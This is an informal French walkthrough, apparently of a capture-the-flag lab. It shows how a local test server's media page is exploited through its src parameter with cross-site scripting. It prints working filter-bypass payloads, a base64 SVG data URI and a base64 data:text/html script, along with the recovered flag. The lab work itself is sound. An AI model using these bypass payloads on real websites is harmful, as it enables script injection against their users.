quand on clique sur l image nasa on trouve se lien http://192.168.56.101/?page=media&src=nsa

on peu donc suposer qu il charge les document depuis le serveur qui sont situer dans src (donc qui l execute)

en bref je tente ca http://192.168.56.101/?page=media&src=Montpellier%3Cscript%3Ealert(document.cookie);%3C/script%3E ca renvoie un truc super bizzare un sorry wrong answer et un 404 not found en meme temps

je pensse que je suis bloquer par une relecture de mon js par le serveur

j ai trouver ca j ai pas trops compris mais si ca permet de bypasse le truc qui lis mon js et qui le vire autemps tenter nhn/tui.editor#1717

ici : http://192.168.56.101/?page=media&src=data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyAKICAgIHhtbG5zOnhsaW5rPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rJyB3aWR0aD0nMTAwJyBoZWlnaHQ9JzEwMCc+PGEgeGxpbms6aHJlZj0namF2YXNjcmlwdDphbGVydCgxKSc+PHJlY3QgeD0nMCcgeT0nMCcgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnIC8+PC9hPjwvc3ZnPg#x

ca me dit : le plugin nest pas supporter a la place du 404 error abithuelle

bref je suis sur la bonne vois je tente donc des recherch et je fait un ctrlf 'data:' sur https://owasp.org/www-community/attacks/xss/

je crois que j ai gagner

je tente dencode <script>alert('coucou')</script> en base 64 ca me donne : PHNjcmlwdD5hbGVydCgnY291Y291Jyk8L3NjcmlwdD4=

http://192.168.56.101/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnY291Y291Jyk8L3NjcmlwdD4=

BIM le flag : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D